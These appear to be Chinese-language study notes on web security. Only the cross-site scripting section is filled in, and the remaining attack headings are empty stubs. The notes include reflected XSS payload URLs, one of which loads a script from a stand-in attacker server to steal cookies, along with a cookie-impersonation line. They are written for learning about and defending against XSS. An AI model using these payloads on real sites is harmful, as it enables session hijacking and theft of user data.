网络安全 39

### xss

跨站脚本攻击

由于 v-html 和 eval()会解析字符串而可能执行脚本而不安全

- 通过注入非本站的 html 标签或脚本以误导用户
- 伪造虚假的表单标签以骗取用户输入个人信息
- 利用本站之外的脚本窃取用户 cookie 以帮助攻击者私自发送请求，如显示伪造的文章或图片，由于获取图片需要发送 http 请求，可以在其 url 后携带 cookie

#### 反射型

即 url 参数拼接

1. 对于普通网址进行参数拼接如`http://localhost:3000/?from=<script>alert(1)</script>`
2. 注入`http://localhost:3000/?from=<script src="localhost:4000/hack.js"></script>`以执行站外脚本，获取 cookie 后存储在攻击者服务器内
3. 短域名伪造`http://dwz.cn`
4. 使用其 cookie 以伪造该用户登录本站`document.cookie="aaaaaaa"`

#### 存储型

即存储到该站数据库后读取时注入

### csrf

### 点击挟持

### sql 注入

### os 注入

### 请求挟持

### ddos
